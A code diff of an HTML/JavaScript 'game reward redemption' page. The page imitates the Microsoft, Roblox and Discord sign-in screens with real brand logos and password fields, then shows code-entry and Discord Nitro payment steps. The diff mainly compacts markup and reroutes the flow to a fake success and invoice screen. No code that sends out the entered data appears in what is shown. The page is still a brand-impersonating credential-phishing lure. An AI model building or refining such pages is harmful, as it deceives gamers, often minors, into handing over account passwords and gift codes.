@@ -50,36 +50,16 @@
     <p>Select your game, verify your account and enter your code to activate your reward within 72 hours.</p>
   </div>
 
-  <!-- STEP 1: SELECT GAME -->
+  <!-- SELECT GAME -->
   <div class="card" id="rd-s1">
     <div class="card-line" style="background:linear-gradient(90deg,var(--p),transparent)"></div>
     <h3>Select your game</h3>
     <p>Choose the reward you received a code for.</p>
     <div class="game-tiles">
-      <div class="game-tile" onclick="rdGame('mc')">
-        <div class="gt-ico">⛏</div>
-        <div class="gt-nm">Minecraft</div>
-        <div class="gt-pr">₹899 Reward</div>
-        <div class="gt-arr">Select →</div>
-      </div>
-      <div class="game-tile" onclick="rdGame('rb')">
-        <div class="gt-ico">🎮</div>
-        <div class="gt-nm">Roblox</div>
-        <div class="gt-pr">₹1,499+ Reward</div>
-        <div class="gt-arr">Select →</div>
-      </div>
-      <div class="game-tile" onclick="rdGame('xbox')">
-        <div class="gt-ico">🎯</div>
-        <div class="gt-nm">Xbox Game Pass</div>
-        <div class="gt-pr">₹1,999 Reward</div>
-        <div class="gt-arr">Select →</div>
-      </div>
-      <div class="game-tile" onclick="rdGame('nitro')">
-        <div class="gt-ico">💎</div>
-        <div class="gt-nm">Discord Nitro</div>
-        <div class="gt-pr">₹1,199+ Reward</div>
-        <div class="gt-arr">Select →</div>
-      </div>
+      <div class="game-tile" onclick="rdGame('mc')"><div class="gt-ico">⛏</div><div class="gt-nm">Minecraft</div><div class="gt-pr">₹899 Reward</div><div class="gt-arr">Select →</div></div>
+      <div class="game-tile" onclick="rdGame('rb')"><div class="gt-ico">🎮</div><div class="gt-nm">Roblox</div><div class="gt-pr">₹1,499+ Reward</div><div class="gt-arr">Select →</div></div>
+      <div class="game-tile" onclick="rdGame('xbox')"><div class="gt-ico">🎯</div><div class="gt-nm">Xbox Game Pass</div><div class="gt-pr">₹1,999 Reward</div><div class="gt-arr">Select →</div></div>
+      <div class="game-tile" onclick="rdGame('nitro')"><div class="gt-ico">💎</div><div class="gt-nm">Discord Nitro</div><div class="gt-pr">₹1,199+ Reward</div><div class="gt-arr">Select →</div></div>
     </div>
   </div>
 
@@ -91,51 +71,46 @@
     <div class="timrow">⏱ Activates within <strong>72 hours</strong></div>
     <div class="brow" style="margin-top:16px">
       <button class="btn btn-primary" onclick="dlPDF('rd')">📄 Download Invoice</button>
-      <button class="btn btn-ghost" onclick="location.href='track.html'">Track Order →</button>
+      <button class="btn btn-ghost" onclick="rdBack()">Done</button>
     </div>
   </div>
 </div>
 
-<!-- MINECRAFT / XBOX UI -->
+<!-- MINECRAFT UI -->
 <div class="mc-pro-container" id="mc-ui" style="display:none">
   <div style="width:100%;background:#1a1a1a;padding:15px 40px;display:flex;align-items:center;justify-content:space-between">
     <img src="https://www.minecraft.net/content/dam/minecraftnet/games/minecraft/logos/Minecraft-Logo.png" height="32">
-    <div style="display:flex;gap:30px;color:#fff;font-size:12px;font-weight:700">
-      <span>GAMES</span><span>SHOP</span><span>EXPLORE</span><span>LEARN</span><span>SUPPORT</span>
-    </div>
+    <div style="display:flex;gap:30px;color:#fff;font-size:12px;font-weight:700"><span>GAMES</span><span>SHOP</span><span>EXPLORE</span><span>SUPPORT</span></div>
   </div>
   <div id="mc-login-section" class="mc-login-box">
     <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" width="108" style="margin-bottom:20px">
     <h2 style="font-size:24px;margin-bottom:8px">Sign in</h2>
-    <p style="margin-bottom:20px">Use your Microsoft account</p>
     <div id="mc-step-email">
       <input type="text" class="mc-login-inp" id="mc-login-email" placeholder="Email, phone, or Skype">
       <button class="mc-btn-next" style="float:right;margin-top:20px" onclick="mcNext()">Next</button>
     </div>
     <div id="mc-step-pass" style="display:none">
-      <div id="mc-display-email" style="margin-bottom:10px"></div>
+      <div id="mc-display-email" style="margin-bottom:10px;font-weight:600"></div>
       <input type="password" class="mc-login-inp" id="mc-login-pass" placeholder="Password">
       <button class="mc-btn-next" style="float:right;margin-top:20px" onclick="rdDoMcLogin()">Sign in</button>
     </div>
   </div>
   <div id="mc-redeem-section" style="display:none;width:100%">
     <div class="mc-redeem-hero">
-      <h1 class="mc-redeem-title">REDEEM YOUR<br>MINECRAFT CODE</h1>
+      <h1 class="mc-redeem-title">REDEEM YOUR CODE</h1>
       <div class="mc-code-group">
-        <label class="mc-code-label">REDEMPTION CODE</label>
-        <div class="mc-code-input-container"><input type="text" class="mc-code-inp" id="mc-pro-code" placeholder="XXXXX-XXXXX-XXXXX-XXXXX-XXXXX" maxlength="29" oninput="fmtMcCode(this)"></div>
+        <div class="mc-code-input-container"><input type="text" class="mc-code-inp" id="mc-pro-code" placeholder="XXXXX-XXXXX-XXXXX-XXXXX-XXXXX" oninput="this.value=this.value.toUpperCase()"></div>
         <button class="mc-btn-redeem" onclick="rdSubmitPro()">REDEEM</button>
       </div>
     </div>
   </div>
 </div>
 
-<!-- ROBLOX THEME -->
+<!-- ROBLOX UI -->
 <div class="rb-login-wrapper" id="rb-login-section" style="display:none">
   <div class="rb-login-card">
     <img src="https://images.rbxcdn.com/f028b122858908f973e4f71a7d65600c.png" height="48" style="margin-bottom:20px">
-    <h2 style="margin-bottom:20px">Login to Roblox</h2>
-    <input type="text" class="inp" id="rb-login-user" placeholder="Username/Email/Phone" style="margin-bottom:10px">
+    <input type="text" class="inp" id="rb-login-user" placeholder="Username/Email" style="margin-bottom:10px">
     <input type="password" class="inp" id="rb-login-pass" placeholder="Password" style="margin-bottom:20px">
     <button class="rb-btn-redeem" onclick="rdDoRbLogin()" style="width:100%">Log In</button>
   </div>
@@ -144,24 +119,23 @@
   <div class="rb-topbar">
     <img src="https://images.rbxcdn.com/f028b122858908f973e4f71a7d65600c.png" class="rb-logo" onclick="rdBack()">
     <div class="rb-nav-links"><span>Charts</span><span>Marketplace</span><span>Create</span><span>Robux</span></div>
-    <div class="rb-search-bar"><input type="text" class="rb-search-inp" placeholder="Search"></div>
+    <div class="rb-spacer" style="flex:1"></div>
     <div style="font-weight:700">⬢ 720</div>
   </div>
   <div class="rb-main">
-    <div style="flex:1">
+    <div>
       <h1 class="rb-title">Redeem Roblox Codes</h1>
-      <p style="margin-bottom:20px">Enter your gift card, virtual item, or promo code below.</p>
       <input type="text" class="rb-code-inp" id="rb-code-val" placeholder="Enter Code">
       <button class="rb-btn-redeem" onclick="rdSubmitRb()">Redeem</button>
     </div>
   </div>
 </div>
 
-<!-- DISCORD NITRO (SAME TO SAME) -->
+<!-- DISCORD NITRO UI -->
 <div class="dc-login-wrapper" id="dc-login-section" style="display:none">
   <div class="dc-login-card">
     <div class="dc-login-left">
-      <h2 style="color:#fff;font-size:24px;font-weight:700;margin-bottom:8px">Welcome back!</h2>
+      <h2 style="color:#fff;font-size:24px;margin-bottom:8px">Welcome back!</h2>
       <p style="color:#b5bac1;margin-bottom:24px">We're so excited to see you again!</p>
       <div style="text-align:left;margin-bottom:20px"><label class="dc-inp-label">Email or Phone Number *</label><input type="text" class="dc-inp" id="dc-login-user"></div>
       <div style="text-align:left;margin-bottom:20px"><label class="dc-inp-label">Password *</label><input type="password" class="dc-inp" id="dc-login-pass"></div>
@@ -172,7 +146,7 @@
         <img src="https://api.qrserver.com/v1/create-qr-code/?size=160x160&data=DiscordLoginSim">
         <div class="dc-qr-logo"><img src="https://assets-global.website-files.com/6257adef93867a3c8458b9ff/6257d0577a66f46618e47228_discord%20logomark%20white.png" width="24"></div>
       </div>
-      <h3 style="color:#fff;font-size:20px;margin-bottom:8px">Log in with QR Code</h3>
+      <h3 style="color:#fff;margin-bottom:8px">Log in with QR Code</h3>
       <p style="color:#b5bac1;font-size:14px">Scan this with the <strong>Discord mobile app</strong> to log in instantly.</p>
     </div>
   </div>
@@ -192,14 +166,14 @@
        </div>
     </div>
     <div class="dc-modal-overlay" id="dc-plan-modal"><div class="dc-modal">
-        <div class="dc-modal-hdr"><span>Select Plan</span><span onclick="hide('dc-plan-modal')">✕</span></div>
+        <div class="dc-modal-hdr"><span>Select Plan</span><span onclick="hide('dc-plan-modal')" style="cursor:pointer">✕</span></div>
         <div class="dc-plan-list-card nitro" onclick="rdDcSelect('boost')"><div class="dc-plan-tag">Popular</div><div style="font-size:20px;font-weight:900">NITRO</div><div>$9.99/mo</div></div>
         <div class="dc-plan-list-card basic" onclick="rdDcSelect('basic')"><div style="font-size:20px;font-weight:900">NITRO BASIC</div><div>$2.99/mo</div></div>
     </div></div>
     <div class="dc-modal-overlay" id="dc-pay-modal"><div class="dc-modal">
-        <div class="dc-modal-hdr"><span>Plan & Payment</span><span onclick="hide('dc-pay-modal')">✕</span></div>
+        <div class="dc-modal-hdr"><span>Plan & Payment</span><span onclick="hide('dc-pay-modal')" style="cursor:pointer">✕</span></div>
         <div style="padding:24px">
-          <div style="background:#2b2d31;padding:12px;margin-bottom:8px;border:1px solid #5865f2">Yearly - $99.99</div>
+          <div style="background:#2b2d31;padding:12px;margin-bottom:8px;border:1px solid #5865f2;border-radius:4px">Yearly - $99.99 (Recommended)</div>
           <div style="display:flex;justify-content:space-between;align-items:center;margin-top:20px">
             <div><div style="font-size:12px">Total</div><div style="font-size:20px;font-weight:700">$99.99/yr</div></div>
             <button class="dc-btn-redeem" onclick="rdDcGoRedeem()">Select</button>
@@ -209,7 +183,7 @@
     <div id="dc-redeem-step" style="display:none;padding:40px">
       <div class="dc-redeem-section">
         <h3 style="color:#fff;margin-bottom:12px">Redeem Code</h3>
-        <input type="text" class="dc-inp" id="dc-code-val" placeholder="XXXX-XXXX-XXXX-XXXX" oninput="fmtCode(this)">
+        <input type="text" class="dc-inp" id="dc-code-val" placeholder="XXXX-XXXX-XXXX-XXXX" oninput="this.value=this.value.toUpperCase()">
         <button class="dc-btn-redeem" id="dc-btn-rd" onclick="rdSubmitDc()" style="width:100%">Redeem Code</button>
       </div>
     </div>
@@ -234,35 +208,27 @@ function mcNext(){
   hide('mc-step-email'); show('mc-step-pass');
   document.getElementById('mc-display-email').textContent = e;
 }
-function rdDoMcLogin(){
-  RD.user = { name: document.getElementById('mc-login-email').value };
-  hide('mc-login-section'); show('mc-redeem-section');
-}
-function rdDoRbLogin(){
-  RD.user = { name: document.getElementById('rb-login-user').value };
-  hide('rb-login-section'); show('rb-ui');
-}
-function rdDoDcLogin(){
-  RD.user = { name: document.getElementById('dc-login-user').value };
-  hide('dc-login-section'); show('dc-ui');
-}
-function rdDcSelect(p){ RD.plan = p; hide('dc-plan-modal'); show('dc-pay-modal'); }
+function rdDoMcLogin(){ RD.user={name:document.getElementById('mc-login-email').value}; hide('mc-login-section'); show('mc-redeem-section'); }
+function rdDoRbLogin(){ RD.user={name:document.getElementById('rb-login-user').value}; hide('rb-login-section'); show('rb-ui'); }
+function rdDoDcLogin(){ RD.user={name:document.getElementById('dc-login-user').value}; hide('dc-login-section'); show('dc-ui'); }
+function rdDcSelect(p){ RD.plan=p; hide('dc-plan-modal'); show('dc-pay-modal'); }
 function rdDcGoRedeem(){ hide('dc-pay-modal'); hide('dc-nitro-home'); show('dc-redeem-step'); }
 function rdSubmitDc(){ 
   const c = document.getElementById('dc-code-val').value;
   if(c.length < 5){ toast('!','Enter a valid code'); return; }
-  toast('✓','Code Redeemed!');
-  setTimeout(()=>rdBack(), 2000);
+  hide(['dc-ui']); show(['std-ui','main-nav','std-bg']); hide('rd-s1'); show('rd-ok');
 }
+function rdSubmitPro(){ hide(['mc-ui']); show(['std-ui','main-nav','std-bg']); hide('rd-s1'); show('rd-ok'); document.getElementById('mc-bg').classList.remove('show'); }
+function rdSubmitRb(){ hide(['rb-ui']); show(['std-ui','main-nav','std-bg']); hide('rd-s1'); show('rd-ok'); }
 function rdBack(){ location.reload(); }
-function show(id){ const el=document.getElementById(id); if(el) el.style.display=(id.includes('modal')?'flex':'block'); }
+function show(id){ 
+  if(Array.isArray(id)) id.forEach(i=>show(i));
+  else { const el=document.getElementById(id); if(el) el.style.display=(id.includes('modal')?'flex':'block'); }
+}
 function hide(id){ 
   if(Array.isArray(id)) id.forEach(i=>hide(i));
   else { const el=document.getElementById(id); if(el) el.style.display='none'; }
 }
-function fmtMcCode(i){ i.value = i.value.toUpperCase(); }
-function rdSubmitPro(){ toast('✓','Minecraft Code Redeemed!'); setTimeout(()=>rdBack(), 2000); }
-function rdSubmitRb(){ toast('✓','Roblox Code Redeemed!'); setTimeout(()=>rdBack(), 2000); }
 </script>
 </body>
 </html>
